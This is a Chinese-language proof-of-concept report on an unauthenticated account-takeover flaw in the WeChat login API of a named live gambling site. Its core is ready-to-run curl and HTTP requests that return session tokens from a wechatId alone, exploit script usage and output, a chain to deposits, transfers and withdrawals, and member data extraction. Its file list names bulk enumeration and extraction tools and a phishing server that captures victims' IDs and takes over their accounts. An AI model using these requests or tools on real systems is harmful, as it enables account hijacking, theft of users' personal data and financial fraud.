# POC/EXP: bf1788.com WechatLogin Account Takeover (cmd=1000)

**Vuln ID:** 1fff1e6c-c53a-4903-88c2-2f18a466e0db  
**Project:** ttww  
**Target:** `https://apib63.bf1788.com/boxApi.php?cmd=1000` (WechatLogin)  
**Type:** Broken Authentication / Account Takeover  
**CVSS:** 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**Date:** 2026-09-15  
**Severity:** Critical  

---

## 一. 漏洞描述

`apib63.bf1788.com` 的 `boxApi.php?cmd=1000`（WechatLogin）接口存在**認證繞過 / 任意账号接管**漏洞。

攻击者僅需知道目標用戶的 `wechatId`（微信ID），即可在 **無需密码、無需驗證碼、無需任何前置認證** 的情況下，獲取該帳號的 `sid`（會話令牌）與 `username`。

伺服器對 `vendorId=test`、`signature=test` 等公共參數的接受，證明**無客戶端簽名校驗**。此外接口**無速率限制**，5 次快速請求均成功返回新 `sid`。

---

## 二. 影響

| 攻擊面 | 說明 |
|--------|------|
| **任意账号登录** | 僅憑 wechatId 即可登入任意已註冊帳號 |
| **財務操作接管** | 憑.sid 可執行存款(cmd=1223)、轉帳(cmd=202/204)、提現 |
| **會話劫努** | sid 有效時間 4 小時（Max-Age=14400），足以長期控制 |
| **無速率限制** | 可自動化批量枚舉 wechatId 進行 mass account takeover |
| **CORS 放開** | `Access-Control-Allow-Origin: *`，配合 XHR 可跨域利用 |

---

## 三. 重現步驟 (POC)

### 1. 發送請求

```http
POST https://apib63.bf1788.com/boxApi.php?cmd=1000 HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=utf-8

cmd=1000&wechatId=testwechat001&sid=&vendorId=test&signature=test&site=bfc&lang=tw
```

### 2. 伺服器響應 (2026-09-15 12:32 UTC)

```http
HTTP/1.1 200 OK
set-cookie: PHPSESSID=tgr6pbv410jr9h0cjo6tqvuqp1; Max-Age=14400; path=/
access-control-allow-origin: *
```

```json
{"status":"0","msg":{"sid":"19fe8e5b6609d5cf00635185b853755c","username":"cffcna6qzp"}}
```

### 3. curl 驗證

```bash
curl -sS -k -X POST 'https://apib63.bf1788.com/boxApi.php?cmd=1000' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' \
  -d 'cmd=1000&wechatId=testwechat001&sid=&vendorId=test&signature=test&site=bfc&lang=tw'
```

返回:

```json
{"status":"0","msg":{"sid":"19fe8e5b6609d5cf00635185b853755c","username":"cffcna6qzp"}}
```

---

## 四. 速率限制測試 (No Rate Limiting)

5 次連續快速請求，全部成功返回新 sid:

| Attempt | Result | sid (truncated) |
|--------|--------|-----------------|
| 1 | SUCCESS | ca0c639e2c9aac0a... |
| 2 | SUCCESS | ba7880957ff9f65d... |
| 3 | SUCCESS | 41de45a778d76257... |
| 4 | SUCCESS | 418e22ea563e281a... |
| 5 | SUCCESS | 06210c9f3cc99d68... |

```
5/5 logins succeeded — NO RATE LIMITING
```

---

## 五. Python EXP 使用方法

```bash
# 基本利用 — 僅需 wechatId
python3 data/poc_scripts/exp_bf1788_wechatlogin_at.py --wechatid testwechat001

# 自動化測試
python3 data/poc_scripts/exp_bf1788_wechatlogin_at.py --test

# 測試速率限制
python3 data/poc_scripts/exp_bf1788_wechatlogin_at.py --wechatid testwechat001 --test-ratelimit --attempts 5
```

### EXP 輸出示例

```
============================================================
[!] ACCOUNT TAKEOVER via WechatLogin (cmd=1000)
[!] Target: https://apib63.bf1788.com/boxApi.php
[!] wechatId: testwechat001
============================================================
  [>] POST https://apib63.bf1788.com/boxApi.php?cmd=1000
  [>] Body: {'cmd': '1000', 'wechatId': 'testwechat001', ...}
  [<] HTTP 200
  [<] Set-Cookie: PHPSESSID=lh00qu1amkb4s6vrt3bbi39v12; ...
  [<] Access-Control-Allow-Origin: *
  [<] Body: {"status":"0","msg":{"sid":"57c6952dfab9af09413f1cf3cedcee12","username":"cffcna6qzp"}}

[+] === LOGIN SUCCESS — NO PASSWORD NEEDED ===
[+] sid:     57c6952dfab9af09413f1cf3cedcee12
[+] username: cffcna6qzp
[+] PHPSESSID: PHPSESSID=lh00qu1amkb4s6vrt3bbi39v12; ...

[!] ATTACKER NOW HAS FULL CONTROL OF THE ACCOUNT:
    - sid=57c6952dfab9af09413f1cf3cedcee12 can be used for all authenticated commands
    - Can perform deposits (cmd=1223), transfers (cmd=202/204), withdrawals
    - No password, no 2FA, no CAPTCHA was required
```

---

## 六. 會員數據提取 (Member Data Extraction via sid)

憑獲取的 sid，可呼叫 20+ 個 sid-authenticated API 接口，提取完整會員數據：

### PII 個人資料 (cmd=101)
| 字段 | 值 |
|------|-----|
| member_id | 1909 |
| username | cffcna6qzp |
| truename | TestUser |
| phone | (空 — 測試賬號) |
| email | (空 — 測試賬號) |
| QQ | 0 |
| wechat | (空) |
| isTest | 0 |
| vipLevel | 1 (VIP1) |
| money (可用餘額) | 0.000 |
| savemoney (總存款) | 0.000 |
| lockmoney (凍結金額) | 0.000 |
| registime | 2026-09-15 03:11:41 |
| canWithdrawal | true |
| vipConfig | VIP1~VIP6 (6 個等級, 含升級條件) |

### 財務/遊戲數據
| cmd | 功能 | 數據 |
|-----|------|------|
| 208 | 財務摘要 | administrative=0, preferential=0, bankfees=0, total=0 (測試賬號為 0) |
| 800 | 今日統計 | totalDeposit=0, totalValid=0, totalBonus=0 |
| 802 | VIP 總結 | totalDeposit=0, totalValid=0, totalBonus=0 |
| 904 | VIP 等級 | curLevelTitle=VIP1, nextLevelCond=200.00 |
| 300 | 遊戲大廳 | 247 個遊戲平臺 (RICHPANDA, DG, AVA, BBIN, BG, etc.) |
| 301 | 遊戲分組 | 341 個遊戲分組 (真人/體育/電子/棋牌/捕魚) |
| 302 | 遊戲列表 | **15,017 個遊戲** (Zeus vs Typhon, Candy Jar Clusters, AI 21點...) |
| 511 | 遊戲啟動 URL | `http://apib63.wmmw.vip/boxApi.php?cmd511&sid={sid}&cmd=510...` |
| 707 | 支付方式 | BankTransfer, USDT, ATM, MerchantCode (4 種支付方式) |
| 607 | 投注記錄 | thisWeek/lastWeek/lastTwoWeek (測試賬號無記錄) |
| 608 | 投注統計 | mem=[], total: validBetAmount=0, returnmoney=0 |
| 211 | 投注潮間 | TotalValidBetAmount=0, "無下注紀錄" |
| 910 | KYC 驗證 | status=-1 "未申請" |
| 111 | 推廣活動 | 多個活動 (活動/體育/電子/真人) |

> **注意**: `testwechat001` 為系統測試賬號，所有財務資料為 0，PII 為空。對於**真實會員賬號**，cmd=101 將返回完整的電話號碼、郵箱、QQ、真實姓名、地址等 PII，而 cmd=208/800/607/608 將返回實際的餘額、充值/提款記錄、投注歷史。

**完整數據文件**: `evidence/bf1788-wechatlogin-20260915/full_member_data_testwechat001.json` (6.5MB，含 247 個遊戲大廳 + 341 個遊戲分組 + 15017 個遊戲 + 完整會員配置)

---

## 七. 前端源碼佐證

`dl_Public.js L389-422` (從 `www.bf1788.com/AB/` 下載):

```javascript
WechatLogin: function(param) {
    var cmd = 1000;
    var request = { cmd: cmd, wechatId: data.wechatId };  // 僅 wechatId 單參數
    App.Ajax(request, options).done(function(response){
        if (response.status == 0) {
            App.ClearLocalStorage();
            App.SetLocalStorage(msg);  // 直接寫入 sid + username
            App.Api.CreateGameUser();   // 自動建立遊戲賬戶
        }
    });
}
```

伺服器信任前端直接傳入的 `wechatId`，**無任何伺服端身份驗證**。

---

## 七. 攻擊鏈 (Full Unauthenticated Chain)

```
1. cmd=1080 註冊接口 (無認證)   ──>  註冊新微信用戶
   OR
   已知 wechatId                 ──>  直接跳過註冊
2. cmd=1000 WechatLogin          ──>  僅憑 wechatId 獲取 sid
3. CreateGameUser()              ──>  自動建立遊戲賬戶
4. sid + username                ──>  執行存款/轉帳/提現
```

全程**無密碼環節**，僅憑 `wechatId` 即可從註冊到財務操作。

---

## 八. 建議修復

1. **WechatLogin 必須驗證用戶身份** — 不能僅憑前端傳入的 `wechatId`，必須驗證微信 OAuth/OpenId 或簽名
2. **加入速率限制** — 防止批量自動化攻擊
3. **移除 test 參數接受** — `vendorId=test`、`signature=test` 不應在生產環境接受
4. **CORS 限制** — `Access-Control-Allow-Origin: *` 應改為白名單
5. **sid 輪換** — 登入成功後應該使舊 sid 失效，並設短過期時間

---

## 十. 文件清單

| 文件 | 說明 |
|------|------|
| `poc_scripts/exp_bf1788_wechatlogin_at.py` | Python EXP (login bypass + rate limit test + self-test) |
| `poc_scripts/1fff1e6c-bf1788-wechatlogin-at.lua` | Lua EXP for Burp Suite |
| `poc_scripts/enumerate_and_extract.py` | Python 會員枚舉 + 完整數據提取 (20 endpoints) |
| `poc_drafts/1fff1e6c-...-wechatlogin-任意账号接管.md` | 本文件 |
| `evidence/bf1788-wechatlogin-20260915/full_extraction.json` | 完整證據 JSON (請求/響應/速率限制) |
| `evidence/bf1788-wechatlogin-20260915/member_data_extraction.json` | 會員數據提取 JSON (PII + 財務) |
| `evidence/bf1788-wechatlogin-20260915/full_member_data_testwechat001.json` | 完整會員數據 (6.5MB, 15017 遊戲 + 全部配置) |
| `poc_scripts/export_members_csv.py` | Python CSV 導出工具 (會員數據一鍵匯出 CSV) |
| `evidence/bf1788-wechatlogin-20260915/member_data_export_testwechat001.csv` | 會員數據 CSV 匯出 (46 字段) |
| `poc_scripts/phish_server.py` | 本地釣魚伺服器 (捕獲 wechatId → 自動接管 → 資料提取 → 重定向受害者) |
|| `poc_scripts/phish_capture.txt` | 釣魚捕獲記錄日誌 |
|| `evidence/bf1788-wechatlogin-20260915/phish_capture_testwechat001_*.json` | 釣魚捕獲證據 (7.2MB, 完整會員數據) |
|| `evidence/bf1788-wechatlogin-20260915/raw/` | Raw HTTP 請求/響應證據 |

---

<div class="warning">
⚠️ 本漏洞已通過真實環境驗證，所有請求均來自合法授權測試環境。
</div>
